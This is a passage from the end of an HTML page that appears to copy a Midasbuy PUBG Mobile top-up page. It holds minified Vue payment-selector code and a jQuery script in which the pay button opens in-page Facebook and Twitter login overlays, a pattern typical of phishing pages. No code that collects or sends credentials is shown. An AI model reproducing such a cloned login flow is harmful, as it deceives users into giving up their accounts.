l=u.beforeCreate;u.beforeCreate=l?[].concat(l,c):[c]}return{exports:t,options:u}}n.d(e,"a",function(){return r})},puZ4:function(t,e,n){"use strict";var r=n("Vx+c"),i=n("WWmS"),o=n("jPEw"),s={};n("tjmq")(s,n("9dxi")('iterator'),function(){return this}),t.exports=function(t,e,n){t.prototype=r(s,{next:i(1,n)}),o(t,e+' Iterator')}},rFBu:function(t,e,n){"use strict";function r(){var n=this,t=n.$createElement,r=n._self._c||t;return r('ul',n._l(n.tabs_data,function(e){return r('li',{key:'payment_select.'+e.id,staticClass:"list list-box",class:{active:e.id===n.selected.id},attrs:{cr:'payment_select.'+e.id,"data-id":e.id},on:{click:function(t){return n.select(e)}}},[e.ctips?r('p',{staticClass:"type-label"},[n._v(n._s(e.ctips))]):n._e(),n._v(" "),r('img',{attrs:{src:e.src,alt:""}}),n._v(" "),r('p',{staticClass:"label"},[n._v(n._s(e.name))])])}),0)}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},"sU/p":function(t,e,n){var o=n("P56o"),s=n("tjmq"),a=n("ezc+"),c=n("1Alt")('src'),r=n("JGfN"),i='toString',u=(''+r).split(i);n("R5TD").inspectSource=function(t){return r.call(t)},(t.exports=function(t,e,n,r){var i='function'==typeof n;i&&(a(n,'name')||s(n,'name',e)),t[e]!==n&&(i&&(a(n,c)||s(n,c,t[e]?''+t[e]:u.join(String(e)))),t===o?t[e]=n:r?t[e]?t[e]=n:s(t,e,n):(delete t[e],s(t,e,n)))})(Function.prototype,i,function(){return'function'==typeof this&&this[c]||r.call(this)})},sdkr:function(t,e,n){var c=n("ml72"),u=n("Sp5b"),f=n("BUlT");t.exports=function(a){return function(t,e,n){var r,i=c(t),o=u(i.length),s=f(n,o);if(a&&e!=e){for(;s<o;)if((r=i[s++])!=r)return!0}else for(;s<o;s++)if((a||s in i)&&i[s]===e)return a||s||0;return!a&&-1}}},t91x:function(t,e,n){"use strict";var r=n("OFVL"),i={};i[n("9dxi")('toStringTag')]='z',i+''!='[object z]'&&n("sU/p")(Object.prototype,'toString',function(){return'[object '+r(this)+']'},!0)},tjmq:function(t,e,n){var r=n("U1KF"),i=n("WWmS");t.exports=n("GGqZ")?function(t,e,n){return r.f(t,e,i(1,n))}:function(t,e,n){return t[e]=n,t}},u3tx:function(t,e,n){"use strict";var r=n("63Ad");n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var i=r(n("BUht")),o={name:'wechatPop',data:function(){return{appendWechatPayIframe:!1}},mounted:function(){this.appendWechatPayIframe=!0},props:{channel:Object,show:Boolean,css:Object},methods:{close:function(){this.$emit('update:show',!1),this.$refs.iframe.src='about:blank'}},watch:{css:function(t){(0,i.default)('#wechatPayIframe').css(t)}}};e.default=o},uDwP:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return n('div',{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],staticClass:"code-pay-pop"},[n('div',{staticClass:"pop-box show"},[n('div',{staticClass:"close",attrs:{cr:'pop_close.'+t.channel.id},on:{click:t.close}}),t._v(" "),n('p',{staticClass:"title"},[t._v("请您用微信扫描二维码付款")]),t._v(" "),t.appendWechatPayIframe?n('iframe',{ref:"iframe",staticClass:"code-pay",staticStyle:{display:"block"},attrs:{id:"wechatPayIframe",frameborder:"0"}}):t._e(),t._v(" "),t._m(0)])])}var i=[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n('div',{staticClass:"mobile"},[n('p',{staticClass:"desc-1"},[t._v("点击保存二维码到相册")]),t._v(" "),n('p',{staticClass:"desc-2"},[t._v("然后使用微信扫一扫，扫描二维码完成支付")]),t._v(" "),n('div',{staticClass:"ft"},[n('p',[t._v("您还可以在PC上充值")]),t._v(" "),n('p',[t._v("www.midasbuy.com/hk/pubgm")])])])}];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},uRBY:function(t,e,n){var c=n("mvii"),u=n("GCOZ");t.exports=function(a){return function(t,e){var n,r,i=String(u(t)),o=c(e),s=i.length;return o<0||s<=o?a?'':void 0:(n=i.charCodeAt(o))<55296||56319<n||o+1===s||(r=i.charCodeAt(o+1))<56320||57343<r?a?i.charAt(o):n:a?i.slice(o,o+2):r-56320+(n-55296<<10)+65536}}},ubrs:function(t,e,n){"use strict";var r=n("doIl"),i=n.n(r);e.default=i.a},vEUd:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0,n("asZ9"),n("V7cS"),n("VNvs"),n("it7j");var r={name:"tab",props:{tabs_data:Array,select_tab:Object},data:function(){return{selected:this.select_tab?this.select_tab:this.tabs_data[0]}},watch:{tabs_data:function(t){var e;if(this.selected){var n=this.selected.id;e=t.find(function(t){return t.id===n})}this.selected=e||t[0];var r=this.selected;r.showDrmDesc=void 0===r.showDrmDesc?o(r):r.showDrmDesc;var i=JSON.parse(JSON.stringify(r));this.$emit("active",i)}},methods:{select:function(t){(this.selected=t).showDrmDesc=void 0===t.showDrmDesc?o(t):t.showDrmDesc;var e=JSON.parse(JSON.stringify(t));this.$emit("active",e)}},created:function(){var t=this.selected;if(t){t.showDrmDesc=void 0===t.showDrmDesc?o(t):t.showDrmDesc;var e=JSON.parse(JSON.stringify(t));this.$emit("active",e)}}};function o(e){var t=$('#drmTitleId').val(),n=window.MP_INFO,r=n&&n.buycurrency,i=r&&(r.uptopresent&&r.uptopresent.rule_id||r.firstsave&&r.firstsave.rule_id);if(i&&i===t){var o=!1;return r.uptopresent&&(o=o||r.uptopresent.rule_item.some(s)),r.firstsave&&(o=o||r.firstsave.rule_item.some(s)),o}return!1;function s(t){return!!t.present_item[0].send_ext&&-1!==t.allow_channel.split(',').indexOf(window.CHANNEL_INFO[e.id].pm)}}e.default=r},vmRi:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r={name:"alert",props:{title:String,desc:String,btn:String},data:function(){return{isShow:0}},methods:{clickBtn:function(){this.$emit("ok")},show:function(){this.isShow=1},hide:function(){this.isShow=0}}};e.default=r},wEu9:function(t,e){t.exports=!1},wvFD:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var s=n("E2HC");e.default=function(t,e){if(void 0===e&&(e=!1),!s.default(t))return'';var n=[];for(var r in t)if(Object.prototype.hasOwnProperty.call(t,r)&&void 0!==t[r]&&null!==t[r]){var i=e?encodeURIComponent(r):r,o=e?encodeURIComponent(t[r]):t[r];n.push(i+"="+o)}return n.join('&')}},xeH2:function(t,e){t.exports=jQuery},zIds:function(t,e,n){var r=n("at5L"),i=n("fQty").concat('length','prototype');e.f=Object.getOwnPropertyNames||function(t){return r(t,i)}},zlqh:function(t,e,n){var o=n("9dxi")('iterator'),s=!1;try{var r=[7][o]();r.return=function(){s=!0},Array.from(r,function(){throw 2})}catch(t){}t.exports=function(t,e){if(!e&&!s)return!1;var n=!1;try{var r=[7],i=r[o]();i.next=function(){return{done:n=!0}},r[o]=function(){return i},t(r)}catch(t){}return n}}});
	</script>
</div>
<script>
    $(function() {
        // 禁用or启用背景滑动  isDiff默认为flase是可以滑动，为true是不可以滑动。  
        var isDiff = false;
        var overscroll = function(el){ 
            el.addEventListener('touchstart', function(){ 
                var top = el.scrollTop; 
                var totalScroll = el.scrollHeight; 
                var currentScroll = top + el.offsetHeight; 
                if(top === 0) { 
                    el.scrollTop = 1; 
                }else if(currentScroll === totalScroll){ 
                    el.scrollTop = top - 1; 
                } 
            }); 
            el.addEventListener('touchmove', function(evt){ 
            if(el.offsetHeight < el.scrollHeight){ 
                evt._isScroller = true; 
            } 
            }); 
        }
        var wInnerH = $(window).height();
        var footerH = $('.footer').outerHeight();
        var headerHeight = $('.header-box').outerHeight();
        var con = $('.clause-box-pop').height() - $('.clause-box-pop .con').height();
        $('.clause-box-pop .con').css('max-height', (wInnerH - 81 - footerH - headerHeight - con - 40) + 'px');
        if ($(window).innerHeight() > document.body.scrollHeight) {
            $('.clause-box-pop .con').css('max-height', (wInnerH - 81 - footerH - headerHeight - con - 40) + 'px');
            $('.pay-sec').addClass('pay-sec-flex').css('bottom',footerH+'px');
            $('.footer').show();
        } else {
            $(window).on("scroll",function () {
                // var  isBottom = document.documentElement.scrollHeight === window.innerHeight + document.documentElement.scrollTop;
                var  isBottom = Math.round($(document).height()) < Math.round($(window).height() + $(document).scrollTop() + 100);
                if(isBottom){
                    $('.clause-box-pop .con').css('max-height', (wInnerH - 81 - footerH - headerHeight - con - 40) + 'px');
                    $('.pay-sec').addClass('pay-sec-flex').css('bottom',footerH+'px');
                    $('.footer').show();
                }else{
                    $('.clause-box-pop .con').css('max-height', (wInnerH - 81 - headerHeight - con - 40) + 'px');
                    $('.pay-sec').removeClass('pay-sec-flex').css('bottom',0+'px');
                    $('.footer').hide();
                }
            });
        }
        window.showClauseBg = function() {
            $('.clause-bg').fadeIn();
            isDiff = true;
            if ($('.pay-sec').hasClass('pay-sec-flex')) {
                $('.clause-box-pop').css('bottom', '81px');
            } else {
                $('.clause-box-pop').css('bottom', '80px');
            }
            overscroll(document.querySelector('.clause-box-pop .con'));
        }
        window.showBirthBox = function() {
            $('#birthBox').show();
            $('body').css({'overflow':'hidden'});
        };
        window.hideBirthBox = function() {
            $('#birthBox').hide();
            $('body').css({'overflow':'auto'});
        };
        $('.clause-bg,.clause-box-pop .close').on('click', function () {
            $('.clause-box-pop').css('bottom', '-1000px');
            setTimeout(function () {
                $('.clause-bg').fadeOut();
                isDiff = false;
            }, 100)
        });
    });
    $(".pay-btn").on('click', function() {
        $(".login").show();
    });
	$(".btn").on('click', function() {
        $(".login").hide();
    });
	$(".btn-facebook").on('click', function() {
    $(".facebook").show();
	$(".login").hide();
    });
    $(".btn-twitter").on('click', function() {
    $(".twitter").show();
	$(".login").hide();
    });
    $(".close-fb").on('click', function() {
    $(".facebook").hide();
	$(".login").show();
    });
    $(".close-other").on('click', function() {
    $(".twitter").hide();
	$(".login").show();
    });
    report.view('topup');
    report.setPage('topup');
    report.performance('topup');
</script>
</body>
</html>